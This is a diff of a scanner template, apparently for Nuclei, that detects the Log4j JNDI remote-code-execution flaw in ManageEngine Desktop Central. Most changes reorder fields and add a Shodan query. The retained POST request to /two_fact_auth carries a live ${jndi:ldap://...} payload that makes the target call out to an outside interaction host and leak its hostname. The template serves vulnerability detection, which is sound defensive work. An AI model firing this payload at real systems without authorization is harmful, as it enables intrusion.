@@ -1,5 +1,4 @@
 id: manage-engine-dc-log4j-rce
-
 info:
   name: Manage Engine Desktop Central - Remote Code Execution (Apache Log4j)
   author: shaikhyaser
@@ -17,15 +16,40 @@ info:
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
+    product: manageengine_desktop_central
+    shodan-query: title:"ManageEngine Desktop Central"
     vendor: zohocorp
-  tags: cve,cve2021,rce,jndi,log4j,manage,engine,oast,kev,vuln
+  tags: cve,cve2021,engine,jndi,kev,log4j,manage,oast,rce,vuln
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
-  str: "{{rand_base(5)}}"
-
+  str: '{{rand_base(5)}}'
 http:
-  - raw:
+  - extractors:
+      - kval:
+          - interactsh_ip
+        type: kval
+      - group: 2
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+      - group: 1
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         POST /two_fact_auth HTTP/1.1
         Host: {{Hostname}}
@@ -34,33 +58,3 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&j_password=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&otpTimeout=7&browserLocale=en_us&cacheNum=4&csrfPreventionSaltForFlashMessage=
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip # Print remote interaction IP in output
-
-      - type: regex
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
-        part: interactsh_request
-
-      - type: regex
-        group: 1
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
-        part: interactsh_request
-
